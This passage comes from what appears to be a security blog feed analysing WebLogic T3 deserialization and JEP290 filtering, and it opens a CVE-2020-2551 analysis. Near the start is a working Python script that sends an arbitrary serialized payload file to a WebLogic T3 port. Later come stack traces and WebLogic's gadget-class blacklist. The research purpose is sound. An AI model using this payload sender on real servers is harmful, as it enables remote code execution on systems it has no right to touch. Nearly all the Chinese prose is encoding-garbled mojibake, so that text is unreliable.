src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15852751007483.jpg" alt="-w647"></p></li></ol></li></ol><p>ÊúÄÁÆÄÂçïÁöÑÊÉÖÂÜµÂΩìÁÑ∂ÊòØÂêéËÄÖÔºå‰∏ãÈù¢ÊòØÂà©Áî®ËÑöÊú¨ÔºåÊ≥®ÊÑèÂ§¥ 4 Â≠óËäÇ‰∏∫Êï∞ÊçÆÊÄªÈïøÂ∫¶</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token keyword">import</span> struct<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">,</span> file<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        sock <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>        sock<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>        server <span class="token operator">=</span> <span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span>        sock<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>server<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># Handshake</span>        handshake <span class="token operator">=</span> b<span class="token string">"t3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://10.211.55.20:7001\nLP:DOMAIN\n\n"</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[>] Sending: %s"</span> <span class="token operator">%</span> handshake<span class="token punctuation">)</span>        sock<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>handshake<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># Receive</span>        message <span class="token operator">=</span> sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[&lt;] Receive: %s"</span> <span class="token operator">%</span> message<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># Send Payload</span>        Obj <span class="token operator">=</span> open<span class="token punctuation">(</span>file<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        payload <span class="token operator">=</span> b<span class="token string">"\x00\x00\x05\xfe\x01\x65\x01\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x71\x00\x00\xea\x60\x00\x00\x00\x18\x0f\xeb\x30\x46\x27\x2d\x8c\xc7\x52\x16\xbb\xd1\x9e\x42\x00\xdc\x6a\x8e\x80\xbe\xbb\x7e\xd5\xbe\x02\x79\x73\x72\x00\x78\x72\x01\x78\x72\x02\x78\x70\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x01\x00\x70\x70\x70\x70\x70\x70\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x01\x00\x70\x06\xfe\x01\x00\x00"</span>        payload <span class="token operator">+=</span> Obj        payload <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">">I"</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> payload<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        <span class="token comment" spellcheck="true"># print("[*] Sending Payload: %s" % payload)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[>] Sending Payload ..."</span><span class="token punctuation">)</span>        sock<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># Receive</span>        message <span class="token operator">=</span> sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[&lt;] Receive: %s"</span> <span class="token operator">%</span> message<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[!] Error: %s"</span> <span class="token operator">%</span> e<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Usage: python t3protocol.py 127.0.0.1 7001 payload.bin"</span><span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token punctuation">)</span>    send<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> int<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><h2 id="T3-Ëß£ÊûêËøáÁ®ã"><a href="#T3-Ëß£ÊûêËøáÁ®ã" class="headerlink" title="T3 Ëß£ÊûêËøáÁ®ã"></a>T3 Ëß£ÊûêËøáÁ®ã</h2><p>‰∏∫‰∫Ü‰∏ãÊñ≠ÁÇπÔºåÂÖàÂ∞Ü src.zip Âä†ÂÖ•Âà∞ Classpath ‰∏≠</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15853030550115.jpg" alt="-w662"></p><pre class=" language-plain"><code class="language-plain">readObject:71, BadAttributeValueExpException (javax.management)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:62, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:498, Method (java.lang.reflect)invokeReadObject:1158, ObjectStreamClass (java.io)readSerialData:2173, ObjectInputStream (java.io)readOrdinaryObject:2064, ObjectInputStream (java.io)readObject0:1568, ObjectInputStream (java.io)readObject:428, ObjectInputStream (java.io)readObject:73, InboundMsgAbbrev (weblogic.rjvm)read:45, InboundMsgAbbrev (weblogic.rjvm)readMsgAbbrevs:325, MsgAbbrevJVMConnection (weblogic.rjvm)init:219, MsgAbbrevInputStream (weblogic.rjvm)dispatch:557, MsgAbbrevJVMConnection (weblogic.rjvm)dispatch:666, MuxableSocketT3 (weblogic.rjvm.t3)dispatch:397, BaseAbstractMuxableSocket (weblogic.socket)readReadySocketOnce:993, SocketMuxer (weblogic.socket)readReadySocket:929, SocketMuxer (weblogic.socket)process:599, NIOSocketMuxer (weblogic.socket)processSockets:563, NIOSocketMuxer (weblogic.socket)run:30, SocketReaderRequest (weblogic.socket)execute:43, SocketReaderRequest (weblogic.socket)execute:147, ExecuteThread (weblogic.kernel)run:119, ExecuteThread (weblogic.kernel)</code></pre><p>ÂÖ∑‰ΩìËøáÁ®ãÂèØËßÅ<a href="https://www.anquanke.com/post/id/201432#h2-3" target="_blank" rel="noopener">https://www.anquanke.com/post/id/201432#h2-3</a><br>‰∏çÂÜçËµòËø∞</p><h2 id="ËøáÊª§Êú∫Âà∂"><a href="#ËøáÊª§Êú∫Âà∂" class="headerlink" title="ËøáÊª§Êú∫Âà∂"></a>ËøáÊª§Êú∫Âà∂</h2><h3 id="JEP290"><a href="#JEP290" class="headerlink" title="JEP290"></a><a href="https://openjdk.java.net/jeps/290" target="_blank" rel="noopener">JEP290</a></h3><blockquote><p>JEP290‰∏ªË¶ÅÊèèËø∞‰∫ÜËøô‰πàÂá†‰∏™Êú∫Âà∂Ôºö</p><ol><li>Êèê‰æõ‰∏Ä‰∏™ÈôêÂà∂ÂèçÂ∫èÂàóÂåñÁ±ªÁöÑÊú∫Âà∂ÔºåÁôΩÂêçÂçïÊàñËÄÖÈªëÂêçÂçï</li><li>ÈôêÂà∂ÂèçÂ∫èÂàóÂåñÁöÑÊ∑±Â∫¶ÂíåÂ§çÊùÇÂ∫¶</li><li>‰∏∫RMIËøúÁ®ãË∞ÉÁî®ÂØπË±°Êèê‰æõ‰∫Ü‰∏Ä‰∏™È™åËØÅÁ±ªÁöÑÊú∫Âà∂</li><li>ÂÆö‰πâ‰∏Ä‰∏™ÂèØÈÖçÁΩÆÁöÑËøáÊª§Êú∫Âà∂ÔºåÊØîÂ¶ÇÂèØ‰ª•ÈÄöËøáÈÖçÁΩÆpropertiesÊñá‰ª∂ÁöÑÂΩ¢ÂºèÊù•ÂÆö‰πâËøáÊª§Âô®</li></ol></blockquote><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15853581669600.jpg" alt="-w499"></p><h3 id="1-filterCheck-in-JDK"><a href="#1-filterCheck-in-JDK" class="headerlink" title="1. filterCheck in JDK"></a>1. filterCheck in JDK</h3><p>Êàë‰ª¨ÈÄöËøáÂú®8u151ÁâàÊú¨‰∏ãÂÆûÁé∞RMIÔºåÂπ∂Â∞ùËØïÁî®cc3ÂèçÂ∫èÂàóÂåñÊù•Êü•ÁúãÊú∫Âà∂Â¶Ç‰ΩïËøõË°åËøáÊª§</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15853596960053.jpg" alt="-w617"></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15853599930145.jpg" alt="-w715"></p><p>Ë∑üÂÖ• checkInputÔºåserialFilter‰∏∫<code>sun.rmi.registry.RegistryImpl</code>ÂØπË±°ÔºåÊâÄ‰ª•ÂÆûÈôÖËøõÂÖ•Âà∞<code>rt.jar!sun.rmi.registry.RegistryImpl#registryFilter</code>ËøõË°åËøáÊª§</p><p>ÂèØ‰ª•ÁúãÂà∞ÂØπÊ∑±Â∫¶„ÄÅÊï∞ÁªÑÂ§ßÂ∞èÂíåÂü∫Êú¨Á±ªÂûãÂÅö‰∫ÜÂà§Êñ≠</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15853607916582.jpg" alt="-w925"></p><p>‰ª•ÂèäÊúÄÂêéÁöÑËøôÊÆµ</p><pre class=" language-java"><code class="language-java">String<span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">!=</span> var2 <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>Number<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>Remote<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>Proxy<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>UnicastRef<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>RMIClientSocketFactory<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>RMIServerSocketFactory<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>ActivationID<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>UID<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">?</span> Status<span class="token punctuation">.</span>REJECTED <span class="token operator">:</span> Status<span class="token punctuation">.</span>ALLOWED<span class="token punctuation">;</span></code></pre><p>Áõ¥Êé•Á¶ÅÁî®‰∫Ü<code>sun.reflect.annotation.AnnotationInvocationHandler</code>ÔºåÊâÄ‰ª•ËøîÂõû‰∫Ü<code>Status.REJECTED</code></p><hr><p>‚ÄúJSONÂèçÂ∫èÂàóÂåñ‰πãÊÆá_ÁúãÈõ™ÂÆâÂÖ®ÂºÄÂèëËÄÖÂ≥∞‰ºö‚ÄùÁöÑÊó∂Â∫èÂõæ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15855538532354.jpg" alt></p><h3 id="2-Weblogic-without-JEP290"><a href="#2-Weblogic-without-JEP290" class="headerlink" title="2. Weblogic without JEP290"></a>2. Weblogic without JEP290</h3><p>ÈÄöËøá‰∏äÈù¢Âú® JDK ‰∏≠ÁöÑÊäµÁî®Ê†à‰ø°ÊÅØÔºåÂèØ‰ª•ÁúãÂà∞Âú® weblogic ‰∏≠ÊòØÈÄöËøá<code>weblogic.rjvm.InboundMsgAbbrev#readObject</code>ËøõÂÖ•ÁöÑ<code>java.io.ObjectInputStream</code></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15854721866812.jpg" alt="-w951"></p><p>Êàë‰ª¨Ë∑üËøõServerChannelInputStreamÁúã‰∏Ä‰∏ã</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15854737021432.jpg" alt="-w1344"></p><p>ÂÜçÁúã‰∏Ä‰∏ã<code>ServerChannelInputStream</code>ÁöÑÁªßÊâøÂÖ≥Á≥ª</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15854751893169.jpg" alt="-w626"></p><p>Âç≥<code>ServerChannelInputStream</code>ÁªßÊâøËá™FilteringObjectInputStreamÔºåÂπ∂ÈÄöËøáÈáçÂÜôresolveClass„ÄÅresolveProxyClass‰ªéËÄåËøõË°åÂèçÂ∫èÂàóÂåñËøáÊª§Èò≤Âæ°</p><p>Êàë‰ª¨Ë∑üËøõcheckLegacyBlacklistIfNeededÁúã‰∏Ä‰∏ãÔºåÂà∞Ëøô<code>weblogic.utils.io.oif.WebLogicObjectInputFilter#checkLegacyBlacklistIfNeeded</code>‰ºöÊ†πÊçÆÊòØÂê¶ÊîØÊåÅJEP290Ëá™Â∏¶ËøáÊª§ÔºåÂú®‰∏çÂèØÁî®ÊÉÖÂÜµ‰∏ã‰ºö‰ΩøÁî®<code>isBlacklistedLegacy</code>ËøõË°åÈò≤Âæ°</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15854755062154.jpg" alt="-w781"></p><p>Ëá≥‰∫éÂì™ÈáåË∞ÉÁî®JEP290ËøáÊª§ÂÖàÊîæ‰∏ÄËæπÔºåÊàë‰ª¨ÂÖàÁúã‰∏ãisBlacklistedLegacy</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15854757085240.jpg" alt="-w786"></p><p>Â¶ÇÊûúÁ±ªÂêçÁ¨¨‰∏Ä‰∏™Â≠óÁ¨¶‰∏∫<code>[</code>ÔºàÊï∞ÁªÑÔºâÔºåÊàñ‰∏∫primitiveTypes‰∏≠ÁöÑÊüêÈ°πÔºåÂ∞±‰∏ç‰ºöËøõË°åÊ£ÄÊµã</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15854758262158.jpg" alt="-w1124"><br>‰πãÂêé‰ºöÊ£ÄÊü•Á±ªÂûãÁ±ªÂêç„ÄÅÂåÖÂêçÊòØÂê¶Âú®LEGACY_BLACKLIST‰∏≠ÔºåÊúâ‰∏ÄÈ°π‰∏çÁ¨¶Âç≥ÂõûÂà∞‰∏äÈù¢ÊäõÂá∫ÂºÇÂ∏∏</p><p>Êàë‰ª¨ÁúãÁúãLEGACY_BLACKLISTÊòØÊÄé‰πàÊù•ÁöÑ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15854765156752.jpg" alt="-w917"></p><p>Ë∑üËøõ<code>weblogic.utils.io.oif.WebLogicFilterConfig</code>ÂèØ‰ª•ÂèëÁé∞ BLACKLIST ÂèñÂÜ≥‰∫éconstructLegacyBlacklistÊñπÊ≥ïÔºåËÄÉËôë‰∏ä‰∏ãÊñáËøΩÊ∫ØËá≥<code>processLegacyBlacklistProperties</code>ÔºåÂõ†‰∏∫Êàë‰ª¨ËÄÉËôëÁöÑÊòØ‰∏çÊîØÊåÅ JEP290 ÁöÑÊÉÖÂÜµÔºåÊâÄ‰ª•ËøõÂÖ•Âà∞ÊúÄÂêéÁöÑ else ÂàÜÊîØ‰∏≠</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15854767314187.jpg" alt="-w1201"></p><p>ÊâÄ‰ª• BLACKLIST Êù•Ê∫ê‰∏ªË¶ÅÊù•Ëá™‰ª•‰∏ã‰∏âÂ§Ñ</p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String<span class="token punctuation">[</span><span class="token punctuation">]</span> DEFAULT_BLACKLIST_PACKAGES <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"org.apache.commons.collections.functors"</span><span class="token punctuation">,</span> <span class="token string">"com.sun.org.apache.xalan.internal.xsltc.trax"</span><span class="token punctuation">,</span> <span class="token string">"javassist"</span><span class="token punctuation">,</span> <span class="token string">"java.rmi.activation"</span><span class="token punctuation">,</span> <span class="token string">"sun.rmi.server"</span><span class="token punctuation">,</span> <span class="token string">"org.jboss.interceptor.builder"</span><span class="token punctuation">,</span> <span class="token string">"org.jboss.interceptor.reader"</span><span class="token punctuation">,</span> <span class="token string">"org.jboss.interceptor.proxy"</span><span class="token punctuation">,</span> <span class="token string">"org.jboss.interceptor.spi.metadata"</span><span class="token punctuation">,</span> <span class="token string">"org.jboss.interceptor.spi.model"</span><span class="token punctuation">,</span> <span class="token string">"com.bea.core.repackaged.springframework.aop.aspectj"</span><span class="token punctuation">,</span> <span class="token string">"com.bea.core.repackaged.springframework.aop.aspectj.annotation"</span><span class="token punctuation">,</span> <span class="token string">"com.bea.core.repackaged.springframework.aop.aspectj.autoproxy"</span><span class="token punctuation">,</span> <span class="token string">"com.bea.core.repackaged.springframework.beans.factory.support"</span><span class="token punctuation">,</span> <span class="token string">"org.python.core"</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String<span class="token punctuation">[</span><span class="token punctuation">]</span> DEFAULT_BLACKLIST_CLASSES <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"org.codehaus.groovy.runtime.ConvertedClosure"</span><span class="token punctuation">,</span> <span class="token string">"org.codehaus.groovy.runtime.ConversionHandler"</span><span class="token punctuation">,</span> <span class="token string">"org.codehaus.groovy.runtime.MethodClosure"</span><span class="token punctuation">,</span> <span class="token string">"org.springframework.transaction.support.AbstractPlatformTransactionManager"</span><span class="token punctuation">,</span> <span class="token string">"java.rmi.server.UnicastRemoteObject"</span><span class="token punctuation">,</span> <span class="token string">"java.rmi.server.RemoteObjectInvocationHandler"</span><span class="token punctuation">,</span> <span class="token string">"com.bea.core.repackaged.springframework.transaction.support.AbstractPlatformTransactionManager"</span><span class="token punctuation">,</span> <span class="token string">"java.rmi.server.RemoteObject"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>System<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"weblogic.rmi.blacklist"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="3-JEP290-in-Weblogic"><a href="#3-JEP290-in-Weblogic" class="headerlink" title="3. JEP290 in Weblogic"></a>3. JEP290 in Weblogic</h3><p>ÂõûÂà∞ JEP290 Ë∞ÉÁî®Ê†àÔºåÊàë‰ª¨Áü•ÈÅìÊúÄÂêéÊòØË∞ÉÁî®filterCheckËøõË°åÁöÑËøáÊª§</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15854773851473.jpg" alt="-w1332"></p><p>Ë∑üÂÖ•ÔºåÊ≠§Êó∂serialFilter‰∏∫sun.misc.ObjectInputFilterÂØπË±°ÔºàÊ≥®ÊÑè JDK ‰∏∫8u151Ôºâ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15854775780406.jpg" alt="-w1642"></p><pre class=" language-plain"><code class="language-plain">maxdepth=100;!org.codehaus.groovy.runtime.ConvertedClosure;!org.codehaus.groovy.runtime.ConversionHandler;!org.codehaus.groovy.runtime.MethodClosure;!org.springframework.transaction.support.AbstractPlatformTransactionManager;!java.rmi.server.UnicastRemoteObject;!java.rmi.server.RemoteObjectInvocationHandler;!com.bea.core.repackaged.springframework.transaction.support.AbstractPlatformTransactionManager;!java.rmi.server.RemoteObject;!org.apache.commons.collections.functors.*;!com.sun.org.apache.xalan.internal.xsltc.trax.*;!javassist.*;!java.rmi.activation.*;!sun.rmi.server.*;!org.jboss.interceptor.builder.*;!org.jboss.interceptor.reader.*;!org.jboss.interceptor.proxy.*;!org.jboss.interceptor.spi.metadata.*;!org.jboss.interceptor.spi.model.*;!com.bea.core.repackaged.springframework.aop.aspectj.*;!com.bea.core.repackaged.springframework.aop.aspectj.annotation.*;!com.bea.core.repackaged.springframework.aop.aspectj.autoproxy.*;!com.bea.core.repackaged.springframework.beans.factory.support.*;!org.python.core.*</code></pre><p>Áúã‰∏äÈù¢ËøáÊª§ÁöÑÁ±ªÊòØ‰∏çÊòØÂæàÁÜüÊÇâÔºåÂÆûÈôÖ‰πüÊòØ<code>weblogic.utils.io.oif.WebLogicFilterConfig</code>ÁîüÊàêÁöÑ filter</p><p>Ë∑üÂÖ•<code>sun.misc.ObjectInputFilter.Config.Global#checkInput</code>ÔºåÊï¥‰Ωì‰ª£Á†ÅÂíåregistryFilter‰∏≠ÁöÑÁ±ª‰ººÔºåÁ∫¢Ê°ÜÂ§ÑÊòØËøõË°åserialFilterÈªëÂêçÂçïÂåπÈÖç</p><blockquote><p>ËøôÈáåÁî®Âà∞‰∫Ü Function&lt;T, U&gt; Êé•Âè£Âíå lambda ËØ≠Ê≥ï</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15854876431547.jpg" alt="-w1608"></p><p>‰∏ãÈù¢ÊòØ filter ÈÄöËøáÁîüËß£ÊûêÁîüÊàêËøáÁ®ãÔºåÈúÄË¶ÅÂú® weblogic ÂêØÂä®Êó∂‰∏ãÊñ≠ÁÇπËßÇÂØüÔºå‰º†ÂÖ•ÁöÑÂÄºÂíåserialFilterÊòØ‰∏ÄËá¥ÁöÑ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15855527639904.jpg" alt="-w1400"></p><p>Â¶ÇÊûúËøîÂõû null ÊàñËÄÖ REJECTED ÈÉΩ‰ºöÊäõÂá∫ÂºÇÂ∏∏ÁªìÊùüÂèçÂ∫èÂàóÂåñÊµÅÁ®ã</p><h2 id="ÂèÇËÄÉËµÑÊñô"><a href="#ÂèÇËÄÉËµÑÊñô" class="headerlink" title="ÂèÇËÄÉËµÑÊñô"></a>ÂèÇËÄÉËµÑÊñô</h2><ol><li><a href="https://www.anquanke.com/post/id/201432" target="_blank" rel="noopener">Weblogic t3 ÂçèËÆÆÂà©Áî®‰∏éÈò≤Âæ°</a></li><li><a href="https://paper.seebug.org/728/" target="_blank" rel="noopener">‰ªéWebLogicÁúãÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÁöÑÂà©Áî®‰∏éÈò≤Âæ°</a></li><li><a href="https://paper.seebug.org/454/" target="_blank" rel="noopener">ÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÁöÑÊú´Êó•ÔºüJEP290Êú∫Âà∂Á†îÁ©∂</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Docker with Weblogic 12.2.1.4.0&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Weblogic" scheme="https://blog.sari3l.com/tags/Weblogic/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-2551 ÁÆÄÂçïÂàÜÊûê</title>
    <link href="https://blog.sari3l.com/posts/e32c5d3e/"/>
    <id>https://blog.sari3l.com/posts/e32c5d3e/</id>
    <published>2020-03-20T04:43:47.000Z</published>
    <updated>2020-07-06T09:45:26.702Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Êê≠Âª∫"><a href="#Êê≠Âª∫" class="headerlink" title="Êê≠Âª∫"></a>Êê≠Âª∫</h2><ul><li>jdk 8u151</li><li>weblogic 12.1.4.0</li></ul><ol><li>ÈÄöËøá<a href="https://github.com/QAX-A-Team/WeblogicEnvironment" target="_blank" rel="noopener">Ê≠§È°πÁõÆ</a>Áõ¥Êé•ÁîüÊàê docker Âπ∂ÂêØÂä®ÔºåÂêåÊó∂Ê†πÊçÆÈ°πÁõÆËØ¥ÊòéÊ∑ªÂä† Remote Êñπ‰æøËøõË°å debug</li><li>ËøõÂÖ• docker Êã∑Ë¥ùÂá∫‰ª•‰∏ãÊñá‰ª∂Âπ∂Ê∑ªÂä†Ëá≥ poc È°πÁõÆ Libraries<ul><li>modules/com.bea.core.repackaged.springframework.spring.jar</li><li>server/lib/wlfullclient.jar</li></ul></li></ol><p>Ê≥®ÊÑèÔºöwlfullclient.jarÂú®12.1.3ÁâàÊú¨ÂêéË¢´ÁßªÈô§Ôºå<a href="https://docs.oracle.com/en/middleware/fusion-middleware/weblogic-server/12.2.1.4/saclt/jarbuilder.html#GUID-FEFB26AB-0D48-4D86-BDE2-FDC04F7CE993" target="_blank" rel="noopener">ÁÇπÊ≠§Êü•ÁúãÂÖ∑‰Ωì‰ø°ÊÅØ</a>Ôºå‰ΩÜÂèØ‰ª•ÈÄöËøá‰ª•‰∏ãÂëΩ‰ª§ÁîüÊàê</p><pre class=" language-shell"><code class="language-shell">cd WL_HOME/server/libjava -jar wljarbuilder.jar</code></pre><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15844996931979.jpg" alt="-w1072"></p><h2 id="ÂàÜÊûê"><a href="#ÂàÜÊûê" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h2><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846793440437.jpg" alt></p><p>IIOP ÂçèËÆÆÁúãÁöÑÂ§¥ÁñºÔºåÂè™Â•ΩÊåâÊµÅÁ®ãËØ¥‰∏Ä‰∏ã</p><p>ÊØè‰∏™ IIOP Êï∞ÊçÆÂåÖÈÉΩ‰ºöËøõÂÖ•<code>weblogic.iiop.ConnectionManager#dispatch</code>ËøõË°åËß£ÊûêÔºåÈïøÂ∫¶<code>end</code>ÂØπÂ∫îÊï∞ÊçÆÂØπÂ∫îÂéüÂßãÂåÖ‰∏≠Êï∞ÊçÆ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846250356635.jpg" alt="-w1917"></p><p>Áõ¥Âà∞Êî∂Âà∞ bind_any ÁöÑÊï∞ÊçÆÂåÖÔºàËøôÈáå wireshark Ê†áËÆ∞Êï∞ÊçÆÊúâ‰∫õÈóÆÈ¢òÔºâ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846279285782.jpg" 